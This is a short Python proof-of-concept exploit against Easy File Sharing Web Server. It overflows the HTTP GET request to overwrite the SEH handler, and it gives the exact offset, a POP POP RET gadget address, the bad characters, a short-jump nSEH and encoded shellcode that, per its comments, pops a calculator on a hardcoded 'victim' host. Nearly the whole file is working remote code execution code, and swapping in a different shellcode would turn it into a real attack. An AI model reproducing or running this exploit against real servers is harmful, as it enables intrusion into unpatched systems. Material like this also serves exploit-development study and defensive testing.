# Author : Nu11pwn
# Code execution and pops a calculator on a victim via -
# abusing a SEH overflow within the get request of the Easy File Sharing Web Server

#!/usr/bin/python

import socket

victim_host = "10.0.0.213"
victim_port = 80

# SEH handler overwritten - 46356646
# [*] Exact match at offset 4065
# 0x1001ab99 : POP POP RET from ImageLoad.dll
# Bad characters : '\x00\x20\x25\x2b\x2f\x5c'

shellcode  = ""
shellcode += "\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9"
shellcode += "\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56"
shellcode += "\xe3\xc9\x71\xfa\x62\x81\xe2\x75\x82\x0b\xb3\xe1\xc0\xd9"
shellcode += "\x0b\x61\xa0\x11\xe7\x03\x41\x84\x7c\xdb\xd2\xa8\x9a\x97"
shellcode += "\xba\x68\x10\xfb\x5b\xe8\xad\x70\x7b\x28\xb3\x86\x08\x64"
shellcode += "\xac\x52\x0e\x8d\xdd\x2d\x3c\x3c\xa0\xfc\xbc\x82\x23\xa8"
shellcode += "\xd7\x94\x6e\x23\xd9\xe3\x05\xd4\x05\xf2\x1b\xe9\x09\x5a"
shellcode += "\x1c\x39\xbd"

seh = "\x99\xab\x01\x10"  # POP POP RET
nseh = "\xeb\x06\x90\x90" # Short JMP forward 6 bytes

exploit_payload  = "A" * 4061
exploit_payload += nseh
exploit_payload += seh
exploit_payload += shellcode
exploit_payload += "\x90" * 7
exploit_payload += "D" * (5000 - len (exploit_payload))

payload  = "GET "
payload += exploit_payload
payload += " HTTP/1.1\r\n"

expl = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
expl.connect((victim_host, victim_port))

expl.send(payload)
print("[x] Easy File Sharing Web Server SEH overwrite")
print("[x] Sending payload to victim")
print("[!] You may need to send it mutiple times")
expl.close()
